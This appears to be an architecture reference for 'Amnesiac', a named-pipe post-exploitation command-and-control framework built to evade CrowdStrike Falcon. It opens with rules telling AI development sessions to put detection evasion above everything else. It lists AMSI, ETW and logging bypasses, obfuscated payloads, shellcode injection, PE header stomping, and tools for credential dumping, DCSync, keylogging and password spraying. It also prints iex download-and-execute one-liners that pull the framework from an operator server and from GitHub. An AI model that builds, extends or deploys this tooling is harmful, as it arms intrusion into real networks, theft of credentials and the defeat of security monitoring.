# Amnesiac Red Team Edition — Architecture Reference

> **For AI development sessions:** Read this document in full before making any changes to the codebase. Every design decision, feature addition, and bug fix must be evaluated against the detection-evasion constraints described here. If a proposed change would create a disk artifact, generate a static signature, or produce anomalous telemetry, it is not acceptable by default.

---

## 1. Purpose and Absolute Priority

Amnesiac is a **post-exploitation command-and-control framework** built on Windows named pipes. It is used by red team operators after initial access has been obtained — for lateral movement, credential harvesting, domain enumeration, and privilege escalation.

### Detection Evasion is the Primary Engineering Constraint

Every feature, tool integration, and code change must be evaluated through this lens first:

| Priority | Constraint |
|----------|-----------|
| **1** | Does not create disk artifacts on monitored machines (targets or EDR-protected operator) |
| **2** | Does not generate AMSI/ETW/SBL telemetry that would alert CrowdStrike Falcon |
| **3** | Does not produce anomalous network traffic from target machines |
| **4** | Does not create recognizable memory patterns (static strings, known signatures) |
| **5** | Feature correctness and usability |

When adding any new feature: **think about what an EDR would observe first, then implement the minimum necessary to achieve the objective without triggering that observation.**

The primary EDR target is **CrowdStrike Falcon** running on Windows 10/11 domain-joined machines. Windows Defender is the secondary target (simpler to evade but still relevant for loading and memory scanning).

---

## 2. Operational Scenarios

Understanding which scenario applies is critical because the constraints differ significantly.

### Scenario 1 — Non-Domain-Joined Operator (External Red Team)

**Setup:** Operator has their own machine (laptop/workstation) that is NOT joined to the target domain. They have domain credentials and network access to the target environment.

```
[Operator Machine — unmonitored]          [Target Network]
   Amnesiac.ps1 running                      Domain controllers
   Tools\ directory populated                Domain-joined machines (EDR-protected)
   serve → HTTP server on port 8080          Named pipe connections back to operator
```

**Launch:**
```powershell
runas /netonly /user:DOMAIN\username powershell.exe
# In the new PS window — inherits Type-9 NewCredentials logon token:
. .\Amnesiac.ps1; Amnesiac -Detached -IP <operator-IP>
```

**Key characteristics:**
- Operator machine has NO EDR monitoring — Defender can be disabled, arbitrary code runs freely
- `Tools\` directory is fully populated on the operator machine — all tools available at startup
- `serve` starts an HTTP server so targets can also pull `Amnesiac_ShellReady.ps1` for bootstrap
- `diskmode` should remain OFF by default even here (to protect targets — writing tool files on targets is an IOC)
- All domain operations (PowerView LDAP, SessionHunter SMB) use the Type-9 NewCredentials token automatically — no explicit credential passing needed
- Reverse Shell (inbound from target) requires port 445 to be open inbound on operator machine — often blocked by corporate firewalls. Prefer Bind Shell in this scenario when firewall is a concern.
- `engagement nondomained` sets the correct profile

**Tool availability in Scenario 1:** Tiers 1 (embedded) + 2 (`Tools\`) + 3 (GitHub fallback on miss) — effectively all tools.

### Scenario 2 — Assumed Breach (Domain-Joined, EDR-Protected)

**Setup:** Operator has obtained a low-privilege shell on a domain-joined machine running CrowdStrike Falcon. They are running Amnesiac ON the compromised machine to move laterally from there.

```
[Compromised Machine — CrowdStrike Falcon active]
   Amnesiac loaded entirely in memory via iex
   No Tools\ directory
   diskmode MUST be OFF
   All tool loads via GitHub or operator HTTP server
```

**Loading sequence (AMSI must be bypassed before the iex):**
```powershell
# Step 1: AMSI bypass in current PS process (required — script is scanned on download)
# <amsi-bypass-one-liner>

# Step 2a: load from operator's HTTP server (preferred if Scenario 1 box is on network)
iex (New-Object Net.WebClient).DownloadString('http://<operator-IP>:8080/Amnesiac_ShellReady.ps1'); Amnesiac

# Step 2b: load directly from operator's fork on GitHub (assumed breach only — no operator box)
iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/0xSiarheiStar/Amnesiac/main/Amnesiac_ShellReady.ps1'); Amnesiac
```

**Key characteristics:**
- `diskmode` MUST be OFF — any disk write triggers CrowdStrike file creation telemetry
- `Amnesiac_ShellReady.ps1` is used (not `Amnesiac.ps1`) — no ANSI color codes, cleaner for constrained shell environments
- No `Tools\` directory — only tier 1 (6 embedded tools) available immediately at startup
- Tools loaded on demand via `Fetch-ToolFromGitHub` from `https://raw.githubusercontent.com/0xSiarheiStar/Amnesiac/main/Tools/`
- Tools in `$global:ToolSources` (e.g., PsMapExec) fetched from their own repos
- GitHub fetch happens OPERATOR-SIDE (in the Amnesiac process on the compromised machine) — this is still a network call FROM the target machine. Acceptable trade-off — operator-controlled repo, single fetch, no disk write.
- `engagement domained` sets the correct profile
- `Local Shell` (option [5]) is the primary way to run tools on the compromised machine without setting up a second pipe connection

**Tool availability in Scenario 2:** Tier 1 only at startup. Tier 3 (GitHub) on demand per tool.

---

## 3. Shell Types

### 3a. Local Shell (Option [5] in main menu)

Runs an interactive command loop **in the current PowerShell process** — no pipe, no second window. This is how an operator in Scenario 2 runs tools on the machine running Amnesiac.

```
Main Menu
  [5] Local Shell
       ↓
  Start-LocalShell
       ↓
  Interactive loop: Invoke-Expression in current runspace
  Tools loaded via Invoke-Expression $global:ToolCache[key]
  Functions become available in current session
       ↓
  HOSTNAME> PowerView         ← loads pwv from cache (or GitHub)
  HOSTNAME> Get-Domain        ← now available in runspace
  HOSTNAME> back              ← returns to main menu
```

**What runs locally:** all `$_cmd` inline commands (AV, Net, Process, Sessions, etc.) and all `$_kw` tool-load keywords (PowerView, Mimi, HashGrab, etc.).

**Detection concern:** Tools execute inside the Amnesiac PS process. If that process is already past AMSI/ETW (bypasses ran at load time), tool execution is largely invisible to script block logging and ETW telemetry.

### 3b. Reverse Shell (formerly "Single Listener")

Target machine calls back to the operator's listening server. The named pipe server runs on the OPERATOR machine (or the compromised machine's own named pipe if doing loopback).

```
Operator (Start-Listener)                   Target
  NamedPipeServerStream listening
  WaitForConnectionAsync (no timeout)
  Q to cancel
       ←  Target executes payload  ←
       ←  \\operator\pipe\name     ←
  Session captured
  Auto-enters InteractWithPipeSession
```

**When to use:** When the target can reach the operator's IP on the pipe port (SMB/445). Typical for internal network engagements where targets can reach the operator machine.

**Detection concern (operator side):** Payload embedded callback address must be the operator's routable IP, not hostname (hostname may not resolve from target). Auto-detection handles this for `-NonDomain` flag.

**Detection concern (target side):** Named pipe creation + outbound SMB connection. The stealth payload mitigates this with ETW disable, SBL disable, and pipe type name splitting.

### 3c. Bind Shell (formerly "Global Listener")

**Operator connects OUT to target machines.** A server payload runs on the target; the operator's `Scan-WaitingTargets` polls targets to see which ones have a waiting pipe.

```
Operator                                    Target
  Print-MultiListener                         Executes server payload
  Scan-WaitingTargets (every 500ms)           NamedPipeServerStream running
  ← connects to \\target\pipe\name ←
  Session captured and listed
  [+] Session received: HOST [user]
```

**When to use:**
- Multiple targets need to be handled in batch
- Operator's machine cannot receive inbound connections (no port 445 open inbound)
- Scenario 1 where firewall blocks reverse shell callbacks

**Target selection:** On non-domain-joined operator, `CheckReachableHosts` (AD enumeration) is unavailable. Operator is prompted to enter targets manually (comma-separated IPs/hostnames, `.` for localhost).

**Session menu:** Sessions are listed as `[6]`, `[7]`, etc. — `[5]` is reserved for Local Shell. Sessions can be bookmarked (`bookmark <N>`), killed (`kill <N>`), or interacted with by number.

---

## 4. Named Pipe Protocol

All remote sessions communicate over Windows named pipes using a line-oriented text protocol.

### Pipe Names

- **Global listener pipe name:** `$global:PipeName` — set from main menu or auto-generated
- **Session-unique values:**
  - `$global:EndMarker` — random 8-char alphanumeric string (replaces hardcoded `#END#`)
  - `$global:BufferSize` — random from {512, 1024, 2048, 4096} bytes (replaces hardcoded 1028)

These are embedded into generated payloads at listener start time. **If the protocol changes mid-session, the listener must be re-invoked to regenerate payloads with updated values.**

### Message Flow (Standard Session)

```
Operator (writer)          Named Pipe              Target (payload)
  cmd + EndMarker    →→→   \\target\pipe\name  →→→  ReadLine loop
                    ←←←   output + EndMarker   ←←←  Invoke-Expression result
```

### Module Streaming Protocol (`Send-Module`)

Used to deliver tool source code from operator cache to target over the pipe:

```
Operator                                    Target
  __MODULE_BEGIN__:<name>:<byteLen>  →→→     stores byteLen
  __MODULE_CHUNK__:<base64-4KB>      →→→     accumulates chunks
  __MODULE_CHUNK__:<base64-4KB>      →→→     ...
  __MODULE_END__:<name>              →→→     assembles source
                                             [scriptblock]::Create($source).Invoke()
                                       OR    [Reflection.Assembly]::Load(bytes)  ← binary
```

### AES Pipe Encryption (optional)

When `psk <passphrase>` is set:
- `Protect-PipeMessage`: AES-128 CBC, random IV prepended, base64 output
- `Unprotect-PipeMessage`: base64 decode, extract IV prefix, decrypt
- Key: `SHA-256(passphrase)[0..15]`
- Applied to every message in both directions

---

## 5. Tool Delivery Architecture

### Operator-Side Cache (`$global:ToolCache`)

All tools live in `$global:ToolCache` (hashtable: cache key → PS source string). Populated in priority order by `Initialize-ToolCache` at startup:

| Tier | Source | Tools | Notes |
|------|--------|-------|-------|
| **1 — Embedded** | gzip+base64 blobs in `Amnesiac.ps1` | SimpleAMSI, NETAMSI, Token-Impersonation, Invoke-SMBRemoting, Invoke-WMIRemoting, Find-LocalAdminAccess | Always available, no network or disk needed |
| **2 — Local directory** | `Tools\` directory scanned at startup | All `.ps1` files in `Tools\`; includes PsMapExec.ps1 (local copy) | `modules reload` refreshes this tier |
| **3 — GitHub on-demand** | `Fetch-ToolFromGitHub` | Any tool not in tiers 1–2 | Operator-side fetch only; target never makes network calls |

### GitHub Fetch Logic (`Fetch-ToolFromGitHub`)

Called automatically when a tool is requested but not in cache (by `Send-Module`, `Start-LocalShell` keyword dispatch, and `load <name>`):

1. Check `$global:ToolSources` for a per-tool URL override
2. If not found, construct default URL: `https://raw.githubusercontent.com/0xSiarheiStar/Amnesiac/main/Tools/<ToolName>.ps1`
3. `(New-Object Net.WebClient).DownloadString($url)` — operator process only
4. Store result in `$global:ToolCache[$ToolName]`
5. Return `$true` on success, `$false` on failure (caller decides what to do)

### Per-Tool URL Overrides (`$global:ToolSources`)

For tools hosted outside the Amnesiac `Tools/` directory — initialized in `Initialize-ToolCache`:

```powershell
$global:ToolSources = @{
    'PsMapExec' = 'https://raw.githubusercontent.com/0xSiarheiStar/PsMapExec/main/PsMapExec.ps1'
}
```

**To add a new tool from an external repo:** add one entry here. The keyword dispatch in `Start-LocalShell` and `load <name>` will use it automatically via `Fetch-ToolFromGitHub`.

### Target-Side Delivery

The target never fetches tools from any network source. `Send-Module` streams from `$global:ToolCache` over the pipe. The target reassembles and executes in memory.

---

## 6. Complete Tool Inventory

### Cache Key → Keyword Mapping

| Keyword (local shell) | Cache Key | File | Category | Source |
|----------------------|-----------|------|----------|--------|
| `Patch` | `SimpleAMSI` | SimpleAMSI.ps1 | Scripts Loading | Tier 1 (embedded) |
| `PatchNet` | `NETAMSI` | NETAMSI.ps1 | Scripts Loading | Tier 1 (embedded) |
| `PInject` | `PInject` | PInject.ps1 | Scripts Loading | Tier 2 (Tools\) |
| `PowerView` | `pwv` | pwv.ps1 | Scripts Loading | Tier 2 (Tools\) |
| `Mimi` | `Suntour` | Suntour.ps1 | Scripts Loading | Tier 2 (Tools\) |
| `Rubeus` | `Ferrari` | Ferrari.ps1 | Scripts Loading | Tier 2 (Tools\) |
| `Ask4Creds` | `Ask4Creds` | Ask4Creds.ps1 | Local Actions | Tier 2 (Tools\) |
| `AutoMimi` | `Suntour` | Suntour.ps1 | Local Actions | Tier 2 (Tools\) — auto-runs `Mimi -Command "sekurlsa::logonpasswords"` |
| `CredMan` | `cms` | cms.ps1 | Local Actions | Tier 2 (Tools\) — auto-runs `Enum-Creds` |
| `Dpapi` | `Dpapi` | Dpapi.ps1 | Local Actions | Tier 2 (Tools\) |
| `HashGrab` | `SimpleAMSI`, `NETAMSI`, `Invoke-GrabTheHash` | multiple | Local Actions | Tier 1+2 — auto-runs `Invoke-GrabTheHash` |
| `Hive` | `HiveDump` | HiveDump.ps1 | Local Actions | Tier 2 (Tools\) — auto-runs `Invoke-HiveDump` |
| `Kerb` | `dumper` | dumper.ps1 | Local Actions | Tier 2 (Tools\) |
| `Keylog` | `klg` | klg.ps1 | Local Actions | Tier 2 (Tools\) |
| `Monitor` | `TGT_Monitor` | TGT_Monitor.ps1 | Local Actions | Tier 2 (Tools\) |
| `MultiRDP` | `TermsrvPatcher` | TermsrvPatcher.ps1 | Local Actions | Tier 2 (Tools\) |
| `PPL` | `ppl` | ppl.ps1 | Local Actions | Tier 2 (Tools\) |
| `CredValidate` | `Validate-Credentials` | Validate-Credentials.ps1 | Domain Actions | Tier 1 (embedded) |
| `DCSync` | `Sync` | Sync.ps1 | Domain Actions | Tier 2 (Tools\) |
| `Impersonation` | `Token-Impersonation` | Token-Impersonation.ps1 | Domain Actions | Tier 1 (embedded) |
| `LocalAdminAccess` | `Find-LocalAdminAccess` | Find-LocalAdminAccess.ps1 | Domain Actions | Tier 1 (embedded) |
| `PassSpray` | `PassSpray` | PassSpray.ps1 | Domain Actions | Tier 2 (Tools\) |
| `Remoting` | `Invoke-SMBRemoting`, `Invoke-WMIRemoting` | multiple | Domain Actions | Tier 1 (embedded) |
| `SessionHunter` | `Invoke-SessionHunter` | Invoke-SessionHunter.ps1 | Domain Actions | Tier 2 (Tools\) |
| `PsMapExec` | `PsMapExec` | PsMapExec.ps1 | Domain Actions | Tier 2 (Tools\, local copy) + Tier 3 (`$global:ToolSources`) |

### Additional Tools in `Tools\` (no keyword mapping yet)

| Cache Key | File | Description |
|-----------|------|-------------|
| `File-Server` | File-Server.ps1 | File server utility |
| `Invoke-Patamenia` | Invoke-Patamenia.ps1 | Additional enumeration |
| `Tkn_Access_Check` | Tkn_Access_Check.ps1 | Token access checking |
| `RDPKeylog` | RDPKeylog.exe | RDP keylogger (binary — loaded via `[Reflection.Assembly]::Load`) |

---

## 7. Payload Formats

Selected via `Show-PayloadMenu` when launching a listener. Each format is a different obfuscation/encoding strategy for the named pipe client payload.

| # | Format | Description | Use case |
|---|--------|-------------|----------|
| 1 | `b64` | PowerShell `-EncodedCommand` base64 | Most compatible, widest support |
| 2 | `gzip` | gzip+base64, shorter | Reduces payload size |
| 3 | `stealth` | gzip+obfuscated, AMSI/ETW/SBL bypasses inline | **Default for CrowdStrike environments** |
| 4 | `raw` | Inline PowerShell, no encoding | Debugging, constrained environments |
| 5 | `pwsh` | `Start-Process` launcher, spawns hidden PS | Process tree evasion |

### Stealth Payload Internals

Built by `New-PayloadScript`. Features added at payload generation time (not at execution time):

| Feature | Why it matters |
|---------|---------------|
| ETW provider disable via reflection | CS uses ETW for script content telemetry |
| SBL (ScriptBlock Logging) disable via reflection | Disabling before pipe code executes prevents Event ID 4104 logging of the payload |
| AMSI bypass (technique selectable: `fail`, `direct`, `pageguard`, `hwbp`) | Prevents AMSI scanning of downloaded content in the target PS process |
| Random 6-10 char variable names (generated at build time) | Breaks static variable-name signatures |
| Type names split across string concatenation | CS static analysis cannot match literal type name strings |
| `New-Object -TypeName $dynamicVar` | Type name never appears as a literal anywhere |
| `& ([scriptblock]::Create($cmd))` instead of `iex` | `iex`/`Invoke-Expression` are heavily signatured |
| Random 1000–5000ms sleep jitter | Breaks timing correlation in CS's ~3 minute behavioral analysis window |
| gzip compression + mixed-case .NET method names | Eliminates readable strings; `FROmbAsE64StRiNg` breaks static string signatures on wrapper |
| `[scriptblock]::Create($d).Invoke()` in decompressor | Avoids any form of `IEX` in the payload |
| try/catch around each bypass | Missing reflection fields (PS version differences) no-op rather than crashing payload |
| Pipe constructor using string enum names | Avoids `[Enum]::Value` expressions that fail when TypeName is a variable |

### Bypass Techniques Available

**AMSI (`Get-AmsiBypassSnippet -Technique`):**
- `fail` — `amsiInitFailed` reflection (simplest, widely known)
- `direct` — `AmsiScanBuffer` byte patch via `Add-Type` P/Invoke
- `pageguard` — `PAGE_GUARD` + VEH via `[AmnesiacLoader.Bypass]::PatchAmsiPageGuard()` — **no byte modification, evades integrity checks**
- `hwbp` — DR0 hardware breakpoint via `[AmnesiacLoader.Bypass]::PatchAmsiHardwareBreakpoint()` — **no byte modification**

**ETW (`Get-EtwBypassSnippet -Technique`):**
- `provider` — `PSEtwLogProvider` field zeroing via reflection
- `patch` — `EtwEventWrite` byte patch via `[AmnesiacLoader.Bypass]::PatchEtwEventWrite()`
- `thread` — per-thread ETW suppression

**SBL (`Get-SblBypassSnippet -Technique`):**
- `scriptblock` — `ScriptBlock.checkScriptBlockLoggingCache = false`
- `module` — module logging flag clear

---

## 8. AmnesiacLoader C# Assembly

Pre-compiled .NET 4.6.2 DLL embedded in `Amnesiac.ps1` as `$AmnesiacLoaderB64`. Loaded on targets via `load loader` session command → `[Reflection.Assembly]::Load(bytes)` → immediately concealed by `Stomper.ConcealLoadedAssembly()`.

Built with `csc.exe` (ships with .NET Framework — no SDK required). Source in `AmnesiacLoader/`.

### Modules

| Class | Method | Purpose |
|-------|--------|---------|
| `Bypass` | `PatchAmsiPageGuard()` | PAGE_GUARD on AmsiScanBuffer + VEH handler — zero-byte-patch AMSI bypass |
| `Bypass` | `PatchAmsiHardwareBreakpoint()` | DR0 breakpoint on AmsiScanBuffer + VEH handler — zero-byte-patch AMSI bypass |
| `Bypass` | `PatchEtwEventWrite()` | xor eax,eax;ret patch on EtwEventWrite in ntdll |
| `Loader / SyscallResolver` | EAT walk, Halo's Gate SSN resolution | Resolve syscall numbers from ntdll without userland hooks; fallback neighbor scan for hooked stubs |
| `Loader / Injector` | `InjectShellcode(pid, bytes)` | Thread RIP hijack via NT indirect syscalls |
| `Loader / Injector` | `InjectNewProcess(path, bytes, ppid)` | PPID-spoofed process creation + Early Bird APC injection |
| `CallStack` | `GetGadget()`, `GetKernelbaseGadget()` | Find RET gadgets in ntdll and kernelbase for two-frame call stack spoof |
| `SleepMask` | `MaskedSleep(ms, base, size)` | AES-128 encrypt implant region during sleep, mark PAGE_NOACCESS, decrypt on wake |
| `Stomper` | `ConcealLoadedAssembly(asm, name)` | Overwrite CLR assembly PE header with a legitimate DLL's header |
| `UnmanagedPS` | `InjectUnmanagedPS(pid, script)` | Run PS code in target process via SMA Runspace |
| `UnmanagedPS` | `SpawnUnmanagedPS(path, script, ppid)` | Spawn new process and deliver PS code via EncodedCommand |

### Build

```powershell
cd AmnesiacLoader
.\Build.ps1
# Compiles all .cs files with csc.exe (/unsafe /optimize+ /debug-)
# Base64-encodes result and writes $AmnesiacLoaderB64 to Amnesiac.ps1
# Preserves UTF-8 BOM
```

---

## 9. Session Flow (End to End)

### Reverse Shell

```
1. Operator selects [1] Reverse Shell from main menu
2. Show-PayloadMenu presents format picker [1-5]
3. Operator selects format (e.g., [3] stealth)
4. New-PayloadScript generates payload with:
   - Selected AMSI/ETW/SBL bypass techniques
   - Random variable names, split type names
   - Jitter, EndMarker, BufferSize embedded
   - Callback IP from $global:IP
5. Payload displayed / copied to clipboard
6. Start-Listener starts NamedPipeServerStream
   - WaitForConnectionAsync loop (no timeout)
   - Phantom connection rejection loop (validates first message within 2s)
   - Press Q to cancel (dummy self-connect unblocks the wait)
7. Target executes payload:
   - AMSI bypass runs first in target PS process
   - ETW + SBL bypasses run
   - Jitter sleep
   - Connects to \\operator\pipe\name
   - Sends first beacon
8. Server validates connection (not phantom)
9. Operator auto-enters InteractWithPipeSession
10. Interactive session: operator types commands, target executes via Invoke-Expression
11. Tool delivery via Send-Module when operator types e.g. "PowerView"
```

### Bind Shell

```
1. Operator selects [2] Bind Shell from main menu
2. Show-PayloadMenu presents format picker
3. Payload generated (server variant — target listens, operator connects)
4. On non-domain operator: prompted for target list (AD enum unavailable)
5. Payload deployed to targets (manual or via Remoting/WMI)
6. Print-MultiListener starts scan loop:
   - Scan-WaitingTargets polls every 500ms
   - Connects to \\target\pipe\name on each configured target
   - Prints arriving sessions: [+] Session received: HOST [user]
7. Press Q to stop collecting sessions
8. Sessions listed in main menu [6], [7], etc.
9. Operator selects session number to interact
```

---

## 10. Key Globals

| Variable | Purpose |
|----------|---------|
| `$global:ToolCache` | Hashtable: cache key → PS source string. The source of truth for all available tools. |
| `$global:ToolSources` | Hashtable: cache key → raw GitHub URL for tools in external repos. |
| `$global:EndMarker` | Random session marker (replaces `#END#`). Embedded in all payloads. |
| `$global:BufferSize` | Random buffer size. Embedded in all payloads. |
| `$global:IP` | Operator's IP address (auto-detected or set via `-HostIP`). Embedded in reverse shell payloads. |
| `$global:DiskMode` | `$false` by default. `$true` enables disk writes (folder creation, logging). |
| `$global:PipeName` | Named pipe name for global listener sessions. |
| `$global:PipeKey` | AES key bytes derived from PSK. Used by Protect/Unprotect-PipeMessage. |
| `$global:EngagementProfile` | `nondomained` or `domained`. Controls OPSEC warnings and defaults. |
| `$global:AmnesiacRoot` | `$PSScriptRoot` captured at dot-source time. Used by `serve` to root HTTP server. |
| `$global:ServerURL` | URL base set by `serve`. Used by session command iex-download URLs. |
| `$global:PayloadConfig` | Hashtable: AMSI/ETW/SBL technique selections, obfuscation level, jitter. |
| `$global:MultipleSessions` | Array of active bind-shell sessions. |
| `$global:AmnesiacArtifacts` | In-memory captures: keylogger, screenshots, clipboard, TGTs, downloads. |
| `$global:TGTCache` | TGT monitor results. Written by `TGT_Monitor`, read by `MonitorRead`. |
| `$global:KeylogFile` | Path to keylog output. Read by `KeylogRead` inline command. |
| `$global:EnvKeys` | Environment key checks embedded in payloads (hostname, domain, user). |

---

## 11. File Structure

```
Amnesiac-main/
├── Amnesiac.ps1                    ← ALL modifications go here (primary file)
├── Amnesiac_ShellReady.ps1         ← Shell-compatible version (no ANSI colour codes)
│                                     Used for Scenario 2 iex bootstrap
├── Tools/                          ← Standard tool tier (loaded at startup)
│   ├── SimpleAMSI.ps1              ← also embedded as Tier 1
│   ├── NETAMSI.ps1                 ← also embedded as Tier 1
│   ├── Token-Impersonation.ps1     ← also embedded as Tier 1
│   ├── Invoke-SMBRemoting.ps1      ← also embedded as Tier 1
│   ├── Invoke-WMIRemoting.ps1      ← also embedded as Tier 1
│   ├── Find-LocalAdminAccess.ps1   ← also embedded as Tier 1
│   ├── PsMapExec.ps1               ← also in $global:ToolSources (external repo)
│   ├── Ask4Creds.ps1
│   ├── cms.ps1
│   ├── Dpapi.ps1
│   ├── dumper.ps1
│   ├── Ferrari.ps1
│   ├── File-Server.ps1
│   ├── HiveDump.ps1
│   ├── Invoke-GrabTheHash.ps1
│   ├── Invoke-Patamenia.ps1
│   ├── Invoke-SessionHunter.ps1
│   ├── klg.ps1
│   ├── PassSpray.ps1
│   ├── PInject.ps1
│   ├── ppl.ps1
│   ├── pwv.ps1
│   ├── RDPKeylog.exe
│   ├── Sync.ps1
│   ├── Suntour.ps1
│   ├── TermsrvPatcher.ps1
│   ├── TGT_Monitor.ps1
│   ├── Tkn_Access_Check.ps1
│   └── Validate-Credentials.ps1
├── AmnesiacLoader/                 ← C# assembly (compile with Build.ps1)
│   ├── Bypass.cs                   ← AMSI pageguard/hwbp, ETW patch
│   ├── CallStack.cs                ← RET gadget finding, call stack spoof
│   ├── Loader.cs                   ← SyscallResolver (EAT+Halo's Gate), Injector
│   ├── SleepMask.cs                ← AES memory encryption during sleep
│   ├── Stomper.cs                  ← PE header stomping / assembly concealment
│   ├── UnmanagedPS.cs              ← In-process PS execution via SMA Runspace
│   ├── AmnesiacLoader.csproj
│   └── Build.ps1                   ← csc.exe compile + embed into Amnesiac.ps1
├── Tests/                          ← Diagnostic and test scripts
│   ├── DiagnoseAMSITrigger.ps1     ← Binary-search AMSI scanner
│   ├── FindParseError.ps1          ← ParseFile vs ParseInput comparison
│   ├── DebugCheckReachable.ps1     ← CheckReachableHosts domain-enum throw test
│   ├── DebugScanLoop.ps1           ← Scan-WaitingTargets behavior test
│   ├── LocalFullFlowTest.ps1       ← End-to-end: generate → pipe → session
│   ├── SpliceLocalShell.ps1        ← Line-range surgery to update Start-LocalShell
│   ├── NewLocalShell.ps1           ← Source for Start-LocalShell function
│   └── Test-AmnesiacHelpers.ps1    ← Pester test suite (47 tests)
├── docs/
│   ├── ARCHITECTURE.md             ← This document
│   └── superpowers/specs/
│       └── 2026-05-23-amnesiac-stealth-overhaul-design.md
├── CLAUDE.md                       ← Quick reference for AI sessions (read first)
├── CHANGELOG.md                    ← Full change history with operational context
└── README.md                       ← Original Amnesiac readme
```

---

## 12. Development Rules for AI Sessions

These rules exist because detection evasion is non-negotiable. Read them before writing any code.

### Rule 1: Detection Evasion Before Everything Else

Before implementing any feature, ask:
- Does this create a disk artifact on a monitored machine?
- Does this produce a static string signature that AMSI/CS can match?
- Does this generate anomalous network traffic FROM a target machine?
- Does this call a signatured API (CreateRemoteThread, VirtualAllocEx, etc.) without indirect syscall mitigation?
- Does this add a comment or variable name that contains a known detection keyword near sensitive code?

If yes to any: redesign before implementing.

### Rule 2: No Disk Writes by Default

Any feature that writes to disk must:
- Be gated behind `$global:DiskMode -eq $true`
- Warn the operator before writing
- Document in the help text that it requires `diskmode on`

### Rule 3: All Tool Delivery via Cache, Never Direct Download on Target

Tools sent to remote sessions must come from `$global:ToolCache` via `Send-Module`. The target must never call `(New-Object Net.WebClient).DownloadString(...)` or similar for tool loading. That is an anomalous outbound HTTP/DNS request that CrowdStrike will flag.

### Rule 4: Adding New Tools — Required Steps

1. Add the `.ps1` file to `Tools/` directory (for Scenario 1 / local copy)
2. If the tool is in an external repo, add to `$global:ToolSources` in `Initialize-ToolCache`
3. Add a keyword entry in `$_kw` inside `Start-LocalShell` (cache keys to load, optional auto-invoke expression)
4. Add a help entry in the `help` section under the appropriate category in `Start-LocalShell`
5. Add to `commands_list.txt` if it belongs in the remote session help menu

### Rule 5: Editing `Amnesiac.ps1` with Em-Dash or Base64

The Edit tool fails on strings containing em-dash `—` (U+2014) or large base64 blobs. Use PowerShell line-range surgery:

```powershell
$lines = [System.IO.File]::ReadAllLines($path, [System.Text.Encoding]::UTF8)
# splice $lines array
[System.IO.File]::WriteAllText($path, ($output -join "`r`n") + "`r`n", [System.Text.Encoding]::UTF8)
```

**Always write back with `[System.Text.Encoding]::UTF8`** (BOM-inclusive). Writing without BOM causes `ParseFile` to use CP1252, where the em-dash byte `0x94` is interpreted as `"` (RIGHT DOUBLE QUOTATION MARK), closing string literals and producing hundreds of cascading parse errors.

### Rule 6: Verify Parse After Every Edit

```powershell
$errs = $null; $toks = $null
[System.Management.Automation.Language.Parser]::ParseFile($path, [ref]$toks, [ref]$errs) | Out-Null
"ParseFile errors: $($errs.Count)"
```

Zero errors required before reporting a change as complete.

### Rule 7: Document in CHANGELOG.md

Every change gets a CHANGELOG entry with:
- **Problem:** what was missing or broken
- **Fix:** what was changed and where
- **Operational context:** why this matters for red team operations

---

## 13. OPSEC Pre-Engagement Checklist

```
[ ] Launch from runas /netonly session (Scenario 1) or domain-joined machine (Scenario 2)
[ ] Set engagement profile: engagement nondomained OR engagement domained
[ ] Confirm diskmode OFF (default): diskmode
[ ] Confirm tool cache loaded: modules
[ ] Run serve if Scenario 2 machines need to pull Amnesiac_ShellReady.ps1 from operator box
[ ] Set psk <passphrase> for AES pipe channel encryption
[ ] Set key hostname <target> before generating payloads (optional — limits accidental execution)
[ ] Review OPSEC banner at startup
[ ] Select launcher vector appropriate for target environment: launcher
[ ] For Reverse Shell: confirm inbound port 445 is reachable from target to operator
[ ] For Bind Shell on non-domain operator: prepare target list (AD enum unavailable)
```

---

## 14. Known Technical Constraints

| Area | Constraint | Details |
|------|-----------|---------|
| **Named pipe transport** | SMB port 445 | Reverse shell requires inbound 445 on operator. Bind shell requires lateral reach to target 445. |
| **PS version** | PowerShell 5.1 | Target payloads are PS 5.1 compatible. `checkScriptBlockLoggingCache` field absent in some builds — bypass wrapped in try/catch. |
| **AMSI in iex** | Bypass BEFORE iex | AMSI scans the script content at download time. Bypass must run in the CURRENT process before calling DownloadString. |
| **Type-9 token** | runas /netonly | PowerView, SessionHunter, and all LDAP/SMB tools use the network token automatically. Must verify token present with `Test-NetworkLogonToken`. |
| **CrowdStrike behavioral window** | ~3 minutes | CS correlates events within a ~3 minute window after process creation. Jitter sleep pushes pipe connection outside this window. |
| **Edit tool + em-dash** | Use PS surgery | Edit tool cannot match strings containing `—` (U+2014). Use ReadAllLines/WriteAllText approach. |
| **UTF-8 BOM** | Required for ParseFile | WriteAllLines without BOM → CP1252 fallback → em-dash decoded as `"` → parse failure. Always use WriteAllText with `[System.Text.Encoding]::UTF8`. |
| **AmnesiacLoader build** | csc.exe only | .NET SDK not available on operator machine. Build.ps1 uses `C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe`. |
